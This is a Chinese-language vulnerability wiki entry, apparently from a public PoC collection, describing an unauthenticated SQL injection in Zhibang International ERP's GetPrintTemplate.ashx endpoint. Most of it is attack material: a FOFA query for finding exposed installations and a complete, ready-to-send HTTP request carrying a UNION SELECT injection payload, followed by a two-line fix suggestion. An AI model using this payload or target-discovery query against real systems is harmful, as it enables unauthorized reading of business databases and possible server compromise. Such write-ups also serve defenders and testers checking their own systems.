---
fofa: "body="
source: "SourByte05/Vulnerability-Wiki-PoC"
---

# 智邦国际ERP GetPrintTemplate.ashx SQL注入

# 漏洞描述

智邦国际ERP GetPrintTemplate.ashx SQL注入，未授权攻击者可进行任意数据库查询操作，甚至可能获取服务器权限。

# 影响版本

智邦国际ERP 

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：body="Win7以上版本系统请以管理员模式运行"

POC/EXP：

```
GET /SYSN/json/pcclient/GetPrintTemplate.ashx?sort=1&ord=-1+UNION+ALL+SELECT+NULL%2CCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28122%29%2BCHAR%28122%29%2BCHAR%28113%29%2BCHAR%2869%29%2BCHAR%2899%29%2BCHAR%2881%29%2BCHAR%2881%29%2BCHAR%28104%29%2BCHAR%2889%29%2BCHAR%2879%29%2BCHAR%28103%29%2BCHAR%28109%29%2BCHAR%28111%29%2BCHAR%28117%29%2BCHAR%2866%29%2BCHAR%2877%29%2BCHAR%2875%29%2BCHAR%28122%29%2BCHAR%2866%29%2BCHAR%2881%29%2BCHAR%28111%29%2BCHAR%28105%29%2BCHAR%2865%29%2BCHAR%28118%29%2BCHAR%28106%29%2BCHAR%28109%29%2BCHAR%2865%29%2BCHAR%28107%29%2BCHAR%28118%29%2BCHAR%2890%29%2BCHAR%2871%29%2BCHAR%2886%29%2BCHAR%28110%29%2BCHAR%28113%29%2BCHAR%2875%29%2BCHAR%2880%29%2BCHAR%28104%29%2BCHAR%2879%29%2BCHAR%28116%29%2BCHAR%2879%29%2BCHAR%2871%29%2BCHAR%28103%29%2BCHAR%2873%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28106%29%2BCHAR%28113%29%2CNULL%2CNULL%2CNULL--+vlPx HTTP/1.1
Host: 127.0.0.1
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Upgrade-Insecure-Requests: 1
```

![image-20250311170705676](./.resource/智邦国际ERPGetPrintTemplate.ashxSQL注入/media/image-20250311170705676.png)


# 漏洞修复

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
